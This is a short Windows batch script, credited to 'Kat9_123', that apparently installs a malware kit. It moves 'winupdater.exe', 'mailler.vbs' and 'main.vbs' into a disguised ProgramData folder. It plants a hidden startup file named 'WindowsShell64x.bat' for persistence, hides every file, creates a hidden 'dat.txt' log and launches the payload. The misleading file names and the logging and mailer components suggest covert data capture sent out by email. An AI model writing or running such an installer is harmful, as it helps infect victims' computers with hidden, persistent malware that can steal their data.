@echo off


rem By: Kat9_123


rem Creates a new directory
mkdir C:\ProgramData\wndwspdtr 

rem Puts 'winupdater.exe' in the new directory
move winupdater.exe C:\ProgramData\wndwspdtr
rem Puts 'mailler.vbs' in the new directory
move mailler.vbs C:\ProgramData\wndwspdtr
rem Puts 'main.vbs' in the new directory
move main.vbs C:\ProgramData\wndwspdtr

rem Go's to the startup folder
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
rem Creates 'WindowsShell64x.bat'
@echo @echo off>>WindowsShell64x.bat
@echo cd C:\ProgramData\wndwspdtr>>WindowsShell64x.bat
@echo start main.vbs>>WindowsShell64x.bat

rem Makes 'WindowsShell64x.bat' invisible
attrib +h WindowsShell64x.bat




rem Go's to the directory
cd C:\ProgramData\wndwspdtr
rem Makes 'mailler.vbs' invisible
attrib +h mailler.vbs
rem Makes 'maill.vbs' invisible
attrib +h winupdater.exe
rem Makes 'mailler.vbs' invisible
attrib +h main.vbs
rem Creates the 'dat.txt' file
@echo Log: >>dat.txt
rem Makes it invisible
attrib +h dat.txt
rem Starts 'main.vbs'
start main.vbs




